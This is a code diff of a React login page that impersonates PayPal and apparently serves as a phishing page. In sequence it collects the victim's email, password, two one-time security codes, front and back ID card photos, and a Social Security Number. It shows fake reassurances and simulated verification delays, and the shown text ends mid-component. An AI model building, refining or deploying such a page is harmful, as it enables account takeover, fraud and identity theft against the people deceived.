@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft, Shield } from "lucide-react";
+import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft, Shield, CheckCircle } from "lucide-react";
 import { SiPaypal } from "react-icons/si";
 import { useToast } from "@/hooks/use-toast";
 
@@ -20,23 +20,6 @@ export default function LoginPage() {
   const [codeSent, setCodeSent] = useState(false);
   const { toast } = useToast();
 
-  const getMaskedPhone = () => {
-    const lastFour = Math.floor(1000 + Math.random() * 9000);
-    return `(•••) •••-${lastFour}`;
-  };
-  
-  const getMaskedEmail = () => {
-    if (email && email.includes("@")) {
-      const [local, domain] = email.split("@");
-      const maskedLocal = local.substring(0, 2) + "••••";
-      return `${maskedLocal}@${domain}`;
-    }
-    return "us••••@gmail.com";
-  };
-  
-  const maskedPhone = getMaskedPhone();
-  const maskedEmail = getMaskedEmail();
-
   const handleEmailNext = (e: React.FormEvent) => {
     e.preventDefault();
     if (email.trim()) {
@@ -49,12 +32,11 @@ export default function LoginPage() {
     if (!password.trim()) return;
 
     setIsLoading(true);
-    // Simulate authentication process
     setTimeout(() => {
       setIsLoading(false);
       setStep("verify-code");
       toast({
-        description: `We sent a security code to ${maskedPhone}`,
+        description: "A security code has been sent to your registered device.",
       });
     }, 1200);
   };
@@ -66,7 +48,7 @@ export default function LoginPage() {
       setCodeSent(true);
       setStep("verify-code");
       toast({
-        description: `We sent a code to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+        description: "Security code sent successfully.",
       });
     }, 1000);
   };
@@ -80,11 +62,10 @@ export default function LoginPage() {
       setIsLoading(false);
       setStep("verifying");
 
-      // After 3 seconds of verifying animation, show second code prompt
       setTimeout(() => {
         setStep("verify-code-2");
         toast({
-          description: `For your security, we sent another code to ${maskedPhone}`,
+          description: "Additional verification required for your security.",
         });
       }, 3000);
     }, 1000);
@@ -116,16 +97,6 @@ export default function LoginPage() {
     setCodeSent(false);
   };
 
-  const handleBackToVerifyMethod = () => {
-    setStep("verify-method");
-    setVerificationCode("");
-  };
-
-  const handleBackToFirstCode = () => {
-    setStep("verify-code");
-    setVerificationCode2("");
-  };
-
   const handleDocumentVerification = (e: React.FormEvent) => {
     e.preventDefault();
     if (!idCardFront || !idCardBack || ssn.length < 9) return;
@@ -134,9 +105,8 @@ export default function LoginPage() {
     setTimeout(() => {
       setIsLoading(false);
       toast({
-        description: "Thank you. Your identity has been verified.",
+        description: "Your identity has been verified successfully.",
       });
-      // Reset all states
       setStep("email");
       setEmail("");
       setPassword("");
@@ -170,107 +140,74 @@ export default function LoginPage() {
   const renderVerifyDocumentsStep = () => (
     <form onSubmit={handleDocumentVerification} data-testid="form-verify-documents">
       <div className="flex flex-col items-center mb-8">
-        <div className="w-20 h-20 rounded-full bg-[#0070e0]/10 dark:bg-[#0070e0]/20 flex items-center justify-center mb-5">
-          <User className="w-10 h-10 text-[#0070e0]" />
+        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-5">
+          <User className="w-8 h-8 text-[#005ea6]" />
         </div>
-        <h1 className="text-[24px] sm:text-[28px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
-          Confirm your identity
+        <h1 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+          Identity Verification
         </h1>
-        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[360px]">
-          To help protect your account, we need to verify your identity with a government-issued ID and Social Security Number
+        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
+          Upload a valid government-issued ID to verify your identity
         </p>
       </div>
 
-      <div className="space-y-6">
-        {/* ID Card Front */}
+      <div className="space-y-5">
         <div>
-          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
+          <label className="block text-[13px] font-medium text-[#111b2a] dark:text-white mb-2">
             ID Card (Front)
           </label>
-          <div className="relative">
-            <input
-              type="file"
-              accept="image/*"
-              onChange={(e) => handleFileUpload(e, "front")}
-              className="hidden"
-              id="id-front"
-              data-testid="input-id-front"
-            />
-            <label
-              htmlFor="id-front"
-              className="flex flex-col items-center justify-center w-full h-[140px] border-2 border-dashed border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#0070e0] hover:bg-[#f5f9fc] dark:hover:bg-[#0a1a2a] transition-all bg-white dark:bg-[#1a1a1a]"
-            >
-              {idCardFront ? (
-                <div className="text-center px-4">
-                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#0070e0]/10 flex items-center justify-center">
-                    <svg className="w-6 h-6 text-[#0070e0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                    </svg>
-                  </div>
-                  <p className="text-[14px] text-[#1a1a1a] dark:text-white font-medium truncate">{idCardFront.name}</p>
-                  <p className="text-[13px] text-[#0070e0] mt-2">Tap to change</p>
-                </div>
-              ) : (
-                <div className="text-center px-4">
-                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center">
-                    <svg className="w-6 h-6 text-[#6c7378]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
-                    </svg>
-                  </div>
-                  <p className="text-[15px] text-[#1a1a1a] dark:text-white font-medium">Upload front of ID</p>
-                  <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG or PNG (max 5MB)</p>
-                </div>
-              )}
-            </label>
-          </div>
+          <input
+            type="file"
+            accept="image/*"
+            onChange={(e) => handleFileUpload(e, "front")}
+            className="hidden"
+            id="id-front"
+            data-testid="input-id-front"
+          />
+          <label
+            htmlFor="id-front"
+            className="flex items-center justify-center w-full h-[100px] border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#005ea6] hover:bg-[#f5f7fa] dark:hover:bg-[#1a2a3a] transition-all bg-white dark:bg-[#1a1a1a]"
+          >
+            {idCardFront ? (
+              <div className="flex items-center gap-3">
+                <CheckCircle className="w-5 h-5 text-[#169b62]" />
+                <span className="text-[14px] text-[#111b2a] dark:text-white">{idCardFront.name}</span>
+              </div>
+            ) : (
+              <span className="text-[14px] text-[#6c7378]">Click to upload front of ID</span>
+            )}
+          </label>
         </div>
 
-        {/* ID Card Back */}
         <div>
-          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
+          <label className="block text-[13px] font-medium text-[#111b2a] dark:text-white mb-2">
             ID Card (Back)
           </label>
-          <div className="relative">
-            <input
-              type="file"
-              accept="image/*"
-              onChange={(e) => handleFileUpload(e, "back")}
-              className="hidden"
-              id="id-back"
-              data-testid="input-id-back"
-            />
-            <label
-              htmlFor="id-back"
-              className="flex flex-col items-center justify-center w-full h-[140px] border-2 border-dashed border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#0070e0] hover:bg-[#f5f9fc] dark:hover:bg-[#0a1a2a] transition-all bg-white dark:bg-[#1a1a1a]"
-            >
-              {idCardBack ? (
-                <div className="text-center px-4">
-                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#0070e0]/10 flex items-center justify-center">
-                    <svg className="w-6 h-6 text-[#0070e0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                    </svg>
-                  </div>
-                  <p className="text-[14px] text-[#1a1a1a] dark:text-white font-medium truncate">{idCardBack.name}</p>
-                  <p className="text-[13px] text-[#0070e0] mt-2">Tap to change</p>
-                </div>
-              ) : (
-                <div className="text-center px-4">
-                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center">
-                    <svg className="w-6 h-6 text-[#6c7378]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
-                    </svg>
-                  </div>
-                  <p className="text-[15px] text-[#1a1a1a] dark:text-white font-medium">Upload back of ID</p>
-                  <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG or PNG (max 5MB)</p>
-                </div>
-              )}
-            </label>
-          </div>
+          <input
+            type="file"
+            accept="image/*"
+            onChange={(e) => handleFileUpload(e, "back")}
+            className="hidden"
+            id="id-back"
+            data-testid="input-id-back"
+          />
+          <label
+            htmlFor="id-back"
+            className="flex items-center justify-center w-full h-[100px] border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#005ea6] hover:bg-[#f5f7fa] dark:hover:bg-[#1a2a3a] transition-all bg-white dark:bg-[#1a1a1a]"
+          >
+            {idCardBack ? (
+              <div className="flex items-center gap-3">
+                <CheckCircle className="w-5 h-5 text-[#169b62]" />
+                <span className="text-[14px] text-[#111b2a] dark:text-white">{idCardBack.name}</span>
+              </div>
+            ) : (
+              <span className="text-[14px] text-[#6c7378]">Click to upload back of ID</span>
+            )}
+          </label>
         </div>
 
-        {/* SSN Input */}
         <div>
-          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
+          <label className="block text-[13px] font-medium text-[#111b2a] dark:text-white mb-2">
             Social Security Number
           </label>
           <input
@@ -279,35 +216,28 @@ export default function LoginPage() {
             placeholder="XXX-XX-XXXX"
             value={ssn}
             onChange={(e) => setSsn(formatSSN(e.target.value))}
-            className="paypal-input"
+            className="paypal-input-2025"
             data-testid="input-ssn"
             maxLength={11}
           />
-          <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-3">
-            Your information is secure and will only be used to verify your identity
-          </p>
         </div>
 
         <button
           type="submit"
-          className="paypal-btn-primary flex items-center justify-center gap-2 mt-8"
+          className="paypal-btn-2025"
           disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9 || isLoading}
           data-testid="button-verify-documents"
         >
           {isLoading ? (
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
           ) : (
-            "Continue"
+            "Submit"
           )}
         </button>
 
-        <div className="pt-6 mt-6 border-t border-[#e8e8e8] dark:border-[#2a2a2a]">
-          <div className="flex items-center justify-center gap-2 text-[#6c7378] dark:text-[#8f8f8f]">
-            <Lock className="w-4 h-4" />
-            <p className="text-[13px]">
-              Your information is encrypted and secure
-            </p>
-          </div>
+        <div className="flex items-center justify-center gap-2 pt-4 text-[#6c7378]">
+          <Lock className="w-3.5 h-3.5" />
+          <span className="text-[12px]">Your information is encrypted and secure</span>
         </div>
       </div>
     </form>
@@ -316,130 +246,147 @@ export default function LoginPage() {
   const renderVerifyCode2Step = () => (
     <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
       <div className="flex flex-col items-center mb-8">
-        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-5">
-          <Lock className="w-8 h-8 text-[#0070e0]" />
+        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-5">
+          <Lock className="w-8 h-8 text-[#005ea6]" />
         </div>
-        <h2 className="text-[24px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
-          Additional security required
+        <h2 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+          Additional Verification
         </h2>
-        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
-          We sent another code to {maskedPhone} to verify your identity
+        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[320px]">
+          For your protection, enter the security code we just sent
         </p>
       </div>
 
-      <div className="space-y-6">
-        <div>
-          <input
-            type="text"
-            inputMode="numeric"
-            pattern="[0-9]*"
-            placeholder="••••••"
-            value={verificationCode2}
-            onChange={(e) => {
-              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
-              setVerificationCode2(value);
-            }}
-            className="w-full h-[60px] px-4 text-center text-[32px] tracking-[0.3em] font-semibold border-2 border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md bg-white dark:bg-[#1a1a1a] text-[#1a1a1a] dark:text-white placeholder-[#d0d0d0] dark:placeholder-[#5a5a5a] transition-all duration-150 focus:outline-none focus:border-[#0070e0] focus:ring-0"
-            data-testid="input-code-2"
-            autoFocus
-            maxLength={6}
-          />
+      <div className="space-y-5">
+        <div className="flex justify-center gap-2">
+          {[0, 1, 2, 3, 4, 5].map((index) => (
+            <input
+              key={index}
+              type="text"
+              inputMode="numeric"
+              maxLength={1}
+              value={verificationCode2[index] || ""}
+              onChange={(e) => {
+                const value = e.target.value.replace(/\D/g, "");
+                if (value) {
+                  const newCode = verificationCode2.split("");
+                  newCode[index] = value;
+                  setVerificationCode2(newCode.join("").slice(0, 6));
+                  const nextInput = e.target.nextElementSibling as HTMLInputElement;
+                  if (nextInput && value) nextInput.focus();
+                }
+              }}
+              onKeyDown={(e) => {
+                if (e.key === "Backspace" && !verificationCode2[index]) {
+                  const prevInput = (e.target as HTMLElement).previousElementSibling as HTMLInputElement;
+                  if (prevInput) prevInput.focus();
+                }
+              }}
+              className="w-12 h-14 text-center text-[24px] font-semibold border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg bg-white dark:bg-[#1a1a1a] text-[#111b2a] dark:text-white focus:outline-none focus:border-[#005ea6] focus:ring-1 focus:ring-[#005ea6]"
+              data-testid={`input-code-2-${index}`}
+              autoFocus={index === 0}
+            />
+          ))}
         </div>
 
         <button
           type="submit"
-          className="paypal-btn-primary flex items-center justify-center gap-2"
+          className="paypal-btn-2025"
           disabled={verificationCode2.length < 6 || isLoading}
           data-testid="button-verify-2"
         >
           {isLoading ? (
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
           ) : (
-            "Continue"
+            "Verify"
           )}
         </button>
 
-        <div className="text-center pt-2">
+        <div className="text-center">
           <button
             type="button"
-            className="paypal-btn-text"
+            className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
             data-testid="button-resend-2"
             onClick={() => {
               toast({
-                description: `We've sent a new code to ${maskedPhone}`,
+                description: "A new security code has been sent.",
               });
             }}
           >
-            Didn't receive a code?
+            Resend code
           </button>
         </div>
       </div>
     </form>
   );
 
-  const footerLinks = [
-    "Help",
-    "Contact",
-    "Fees", 
-    "Security",
-    "Apps",
-    "Shop",
-    "Enterprise",
-    "Partners"
-  ];
+  const renderVerifyingStep = () => (
+    <div className="flex flex-col items-center py-12" data-testid="screen-verifying">
+      <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-6">
+        <div className="w-8 h-8 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin" />
+      </div>
+      <h2 className="text-[20px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+        Verifying
+      </h2>
+      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
+        Please wait while we verify your information
+      </p>
+    </div>
+  );
 
   const renderEmailStep = () => (
     <form onSubmit={handleEmailNext} data-testid="form-email">
-      {/* Header with Security Shield and Title */}
       <div className="flex items-center gap-4 mb-8">
-        {/* Security Shield with PayPal Logo */}
         <div className="relative flex-shrink-0" data-testid="icon-security-shield">
-          <Shield className="w-14 h-14 text-[#003087] fill-[#003087]/10" strokeWidth={1.5} />
-          <SiPaypal className="w-5 h-5 text-[#003087] absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
+          <Shield className="w-12 h-12 text-[#005ea6] fill-[#005ea6]/10" strokeWidth={1.5} />
+          <SiPaypal className="w-4 h-4 text-[#003087] absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
         </div>
         <div className="flex-1">
           <h1 
-            className="text-[22px] sm:text-[24px] font-semibold text-[#1a1a1a] dark:text-white tracking-tight leading-tight mb-2"
+            className="text-[22px] font-semibold text-[#111b2a] dark:text-white leading-tight mb-1"
             data-testid="text-title"
           >
             Verify Your Identity
           </h1>
           <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f]">
-            Log in to enhance and secure your account
+            Log in to secure your account
           </p>
         </div>
       </div>
 
-      <div className="space-y-5">
-        <div>
-          <input
-            type="text"
-            placeholder="Email or mobile number"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            className="paypal-input"
-            data-testid="input-email"
-            autoComplete="email"
-            autoFocus
-          />
-        </div>
+      <div className="space-y-4">
+        <input
+          type="text"
+          placeholder="Email or mobile number"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          className="paypal-input-2025"
+          data-testid="input-email"
+          autoComplete="email"
+          autoFocus
+        />
 
         <button
           type="submit"
-          className="paypal-btn-primary"
+          className="paypal-btn-2025"
           disabled={!email.trim()}
           data-testid="button-next"
         >
           Next
         </button>
 
-        <div className="paypal-divider">
-          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] font-medium">or</span>
+        <div className="relative py-4">
+          <div className="absolute inset-0 flex items-center">
+            <div className="w-full border-t border-[#e5e5e5] dark:border-[#2a2a2a]" />
+          </div>
+          <div className="relative flex justify-center">
+            <span className="px-4 text-[13px] text-[#6c7378] bg-white dark:bg-[#121212]">or</span>
+          </div>
         </div>
 
         <button
           type="button"
-          className="paypal-btn-secondary"
+          className="paypal-btn-secondary-2025"
           data-testid="button-signup"
           onClick={() => {
             window.location.href = "https://www.paypal.com/us/webapps/mpp/account-selection";
@@ -455,7 +402,7 @@ export default function LoginPage() {
     <form onSubmit={handlePasswordNext} data-testid="form-password">
       <div className="flex flex-col items-center mb-8">
         <div 
-          className="w-[72px] h-[72px] rounded-full bg-gradient-to-br from-[#0070e0] to-[#003087] flex items-center justify-center text-[28px] font-semibold text-white mb-4 shadow-lg"
+          className="w-16 h-16 rounded-full bg-[#005ea6] flex items-center justify-center text-[24px] font-semibold text-white mb-4"
           data-testid="avatar-user"
         >
           {email.charAt(0).toUpperCase()}
@@ -463,7 +410,7 @@ export default function LoginPage() {
         <button
           type="button"
           onClick={handleBackToEmail}
-          className="paypal-link text-[15px] flex items-center gap-1"
+          className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium flex items-center gap-1"
           data-testid="button-change-email"
         >
           {email}
@@ -471,14 +418,14 @@ export default function LoginPage() {
         </button>
       </div>
 
-      <div className="space-y-5">
+      <div className="space-y-4">
         <div className="relative">
           <input
             type={showPassword ? "text" : "password"}
             placeholder="Password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
-            className="paypal-input pr-14"
+            className="paypal-input-2025 pr-12"
             data-testid="input-password"
             autoComplete="current-password"
             autoFocus
@@ -486,33 +433,26 @@ export default function LoginPage() {
           <button
             type="button"
             onClick={() => setShowPassword(!showPassword)}
-            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white transition-colors"
+            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7378] hover:text-[#111b2a] dark:hover:text-white transition-colors"
             data-testid="button-toggle-password"
-            aria-label={showPassword ? "Hide password" : "Show password"}
           >
-            {showPassword ? (
-              <EyeOff className="w-5 h-5" />
-            ) : (
-              <Eye className="w-5 h-5" />
-            )}
+            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
           </button>
         </div>
 
-        <div className="flex justify-between items-center">
-          <label className="flex items-center gap-2 cursor-pointer group">
+        <div className="flex justify-between items-center text-[13px]">
+          <label className="flex items-center gap-2 cursor-pointer">
             <input 
               type="checkbox" 
-              className="w-4 h-4 rounded border-2 border-[#c4c4c4] text-[#0070e0] focus:ring-[#0070e0] focus:ring-offset-0"
+              className="w-4 h-4 rounded border-[#cbd2d6] text-[#005ea6] focus:ring-[#005ea6]"
             />
-            <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] group-hover:text-[#1a1a1a] dark:group-hover:text-white transition-colors">
-              Stay logged in
-            </span>
+            <span className="text-[#6c7378]">Stay logged in</span>
           </label>
           <a
             href="https://www.paypal.com/us/smarthelp/contact-us?email=recover"
             target="_blank"
             rel="noopener noreferrer"
-            className="paypal-btn-text"
+            className="text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
             data-testid="link-forgot-password"
           >
             Forgot password?
@@ -521,7 +461,7 @@ export default function LoginPage() {
 
         <button
           type="submit"
-          className="paypal-btn-primary flex items-center justify-center gap-2"
+          className="paypal-btn-2025"
           disabled={!password.trim() || isLoading}
           data-testid="button-login"
         >
@@ -532,17 +472,20 @@ export default function LoginPage() {
           )}
         </button>
 
-        <div className="paypal-divider">
-          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] font-medium">or</span>
+        <div className="relative py-4">
+          <div className="absolute inset-0 flex items-center">
+            <div className="w-full border-t border-[#e5e5e5] dark:border-[#2a2a2a]" />
+          </div>
+          <div className="relative flex justify-center">
+            <span className="px-4 text-[13px] text-[#6c7378] bg-white dark:bg-[#121212]">or</span>
+          </div>
         </div>
 
         <button
           type="button"
-          className="paypal-btn-secondary flex items-center justify-center gap-2"
+          className="paypal-btn-secondary-2025 flex items-center justify-center gap-2"
           data-testid="button-one-touch"
-          onClick={() => {
-            setStep("verify-method");
-          }}
+          onClick={() => setStep("verify-method")}
         >
           <User className="w-5 h-5" />
           Log in with a one-time code
@@ -556,7 +499,7 @@ export default function LoginPage() {
       <button
         type="button"
         onClick={handleBackToPassword}
-        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
+        className="flex items-center gap-1 text-[#6c7378] hover:text-[#111b2a] dark:hover:text-white mb-6"
         data-testid="button-back-password"
       >
         <ChevronLeft className="w-5 h-5" />
@@ -564,14 +507,14 @@ export default function LoginPage() {
       </button>
 
       <div className="flex flex-col items-center mb-6">
-        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
-          <Lock className="w-8 h-8 text-[#0070e0]" />
+        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-4">
+          <Lock className="w-8 h-8 text-[#005ea6]" />
         </div>
-        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
-          Verify it's you
+        <h2 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+          Verify Your Identity
         </h2>
-        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-          We'll send you a code to confirm your identity
+        <p className="text-[14px] text-[#6c7378] text-center">
+          Choose how you'd like to receive your security code
         </p>
       </div>
 
@@ -579,22 +522,22 @@ export default function LoginPage() {
         <button
           type="button"
           onClick={() => setSelectedMethod("sms")}
-          className={`w-full p-4 rounded-lg border-2 flex items-center gap-4 transition-all ${
+          className={`w-full p-4 rounded-lg border flex items-center gap-4 transition-all ${
             selectedMethod === "sms" 
-              ? "border-[#0070e0] bg-[#f5f9fc] dark:bg-[#0a1a2a]" 
-              : "border-[#e0e0e0] dark:border-[#3d3d3d] hover:border-[#a0a0a0] dark:hover:border-[#5a5a5a]"
+              ? "border-[#005ea6] bg-[#f5f7fa] dark:bg-[#1a2a3a]" 
+              : "border-[#e5e5e5] dark:border-[#3d3d3d] hover:border-[#005ea6]"
           }`}
           data-testid="option-sms"
         >
-          <div className="w-10 h-10 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
-            <Smartphone className="w-5 h-5 text-[#0070e0]" />
+          <div className="w-10 h-10 rounded-full bg-[#005ea6]/10 flex items-center justify-center">
+            <Smartphone className="w-5 h-5 text-[#005ea6]" />
           </div>
-          <div className="text-left">
-            <p className="text-[15px] font-medium text-[#1a1a1a] dark:text-white">Text message</p>
-            <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]">{maskedPhone}</p>
+          <div className="text-left flex-1">
+            <p className="text-[15px] font-medium text-[#111b2a] dark:text-white">Text message</p>
+            <p className="text-[13px] text-[#6c7378]">Send code via SMS</p>
           </div>
           {selectedMethod === "sms" && (
-            <div className="ml-auto w-5 h-5 rounded-full bg-[#0070e0] flex items-center justify-center">
+            <div className="w-5 h-5 rounded-full bg-[#005ea6] flex items-center justify-center">
               <div className="w-2 h-2 rounded-full bg-white" />
             </div>
           )}
@@ -603,22 +546,22 @@ export default function LoginPage() {
         <button
           type="button"
           onClick={() => setSelectedMethod("email")}
-          className={`w-full p-4 rounded-lg border-2 flex items-center gap-4 transition-all ${
+          className={`w-full p-4 rounded-lg border flex items-center gap-4 transition-all ${
             selectedMethod === "email" 
-              ? "border-[#0070e0] bg-[#f5f9fc] dark:bg-[#0a1a2a]" 
-              : "border-[#e0e0e0] dark:border-[#3d3d3d] hover:border-[#a0a0a0] dark:hover:border-[#5a5a5a]"
+              ? "border-[#005ea6] bg-[#f5f7fa] dark:bg-[#1a2a3a]" 
+              : "border-[#e5e5e5] dark:border-[#3d3d3d] hover:border-[#005ea6]"
           }`}
           data-testid="option-email"
         >
-          <div className="w-10 h-10 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
-            <Mail className="w-5 h-5 text-[#0070e0]" />
+          <div className="w-10 h-10 rounded-full bg-[#005ea6]/10 flex items-center justify-center">
+            <Mail className="w-5 h-5 text-[#005ea6]" />
           </div>
-          <div className="text-left">
-            <p className="text-[15px] font-medium text-[#1a1a1a] dark:text-white">Email</p>
-            <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]">{maskedEmail}</p>
+          <div className="text-left flex-1">
+            <p className="text-[15px] font-medium text-[#111b2a] dark:text-white">Email</p>
+            <p className="text-[13px] text-[#6c7378]">Send code via email</p>
           </div>
           {selectedMethod === "email" && (
-            <div className="ml-auto w-5 h-5 rounded-full bg-[#0070e0] flex items-center justify-center">
+            <div className="w-5 h-5 rounded-full bg-[#005ea6] flex items-center justify-center">
               <div className="w-2 h-2 rounded-full bg-white" />
             </div>
           )}
@@ -628,7 +571,7 @@ export default function LoginPage() {
       <button
         type="button"
         onClick={handleSendCode}
-        className="paypal-btn-primary flex items-center justify-center gap-2"
+        className="paypal-btn-2025"
         disabled={isLoading}
         data-testid="button-send-code"
       >
@@ -638,88 +581,80 @@ export default function LoginPage() {
           "Send Code"
         )}
       </button>
-
-      <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-4">
-        Standard messaging rates may apply
-      </p>
-    </div>
-  );
-
-  const renderVerifyingStep = () => (
-    <div data-testid="form-verifying" className="flex flex-col items-center justify-center py-16">
-      <div className="mb-10 relative">
-        <div className="w-20 h-20 animate-pulse flex items-center justify-center">
-          <img src="/favicon.png" alt="PayPal" className="w-full h-full object-contain" />
-        </div>
-        <div className="absolute -inset-3 rounded-full border-[3px] border-[#0070e0] border-t-transparent animate-spin" />
-      </div>
-      <h2 className="text-[20px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
-        Verifying your security code
-      </h2>
-      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[320px]">
-        This may take a moment
-      </p>
     </div>
   );
 
   const renderVerifyCodeStep = () => (
     <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
       <div className="flex flex-col items-center mb-8">
-        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-5">
-          <Smartphone className="w-8 h-8 text-[#0070e0]" />
+        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-5">
+          <Smartphone className="w-8 h-8 text-[#005ea6]" />
         </div>
-        <h2 className="text-[24px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
-          Enter security code
+        <h2 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+          Enter Security Code
         </h2>
-        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
-          We sent a 6-digit code to {maskedPhone}
+        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[300px]">
+          Enter the 6-digit code we sent to verify your identity
         </p>
       </div>
 
-      <div className="space-y-6">
-        <div>
-          <input
-            type="text"
-            inputMode="numeric"
-            pattern="[0-9]*"
-            placeholder="••••••"
-            value={verificationCode}
-            onChange={(e) => {
-              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
-              setVerificationCode(value);
-            }}
-            className="w-full h-[60px] px-4 text-center text-[32px] tracking-[0.3em] font-semibold border-2 border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md bg-white dark:bg-[#1a1a1a] text-[#1a1a1a] dark:text-white placeholder-[#d0d0d0] dark:placeholder-[#5a5a5a] transition-all duration-150 focus:outline-none focus:border-[#0070e0] focus:ring-0"
-            data-testid="input-code"
-            autoFocus
-            maxLength={6}
-          />
+      <div className="space-y-5">
+        <div className="flex justify-center gap-2">
+          {[0, 1, 2, 3, 4, 5].map((index) => (
+            <input
+              key={index}
+              type="text"
+              inputMode="numeric"
+              maxLength={1}
+              value={verificationCode[index] || ""}
+              onChange={(e) => {
+                const value = e.target.value.replace(/\D/g, "");
+                if (value) {
+                  const newCode = verificationCode.split("");
+                  newCode[index] = value;
+                  setVerificationCode(newCode.join("").slice(0, 6));
+                  const nextInput = e.target.nextElementSibling as HTMLInputElement;
+                  if (nextInput && value) nextInput.focus();
+                }
+              }}
+              onKeyDown={(e) => {
+                if (e.key === "Backspace" && !verificationCode[index]) {
